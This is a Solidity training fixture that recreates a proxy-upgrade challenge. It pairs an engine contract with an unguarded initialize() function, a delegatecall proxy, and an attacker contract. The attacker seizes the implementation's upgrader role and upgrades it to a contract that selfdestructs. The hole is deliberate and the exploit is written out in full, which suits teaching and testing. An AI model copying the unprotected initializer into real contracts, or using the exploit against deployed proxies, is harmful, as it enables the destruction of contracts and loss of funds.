// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract MotorbikeEngine {
    address public upgrader;
    address public implementation;
    bool public initialized;

    function initialize() external {
        require(!initialized, "already initialized");
        upgrader = msg.sender;
        initialized = true;
    }

    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        require(msg.sender == upgrader, "not upgrader");
        implementation = newImplementation;
        (bool ok,) = newImplementation.delegatecall(data);
        require(ok, "upgrade call failed");
    }
}

contract Motorbike {
    address public upgrader;
    address public implementation;
    bool public initialized;

    constructor(address engine) {
        implementation = engine;
    }

    fallback() external payable {
        (bool ok,) = implementation.delegatecall(msg.data);
        require(ok, "delegatecall failed");
    }
}

contract MotorbikeAttacker {
    function attack(MotorbikeEngine engineImpl, address player) external returns (bool) {
        engineImpl.initialize();
        engineImpl.upgradeToAndCall(
            address(new MotorbikeKiller()),
            abi.encodeWithSignature("kill()")
        );
        return true;
    }
}

contract MotorbikeKiller {
    event Killed(address target);

    function kill() external {
        emit Killed(address(this));
        selfdestruct(payable(msg.sender));
    }
}

// Local training fixture: the engine is deployed separately from the proxy and
// can be initialized by anyone, letting an attacker selfdestruct it.

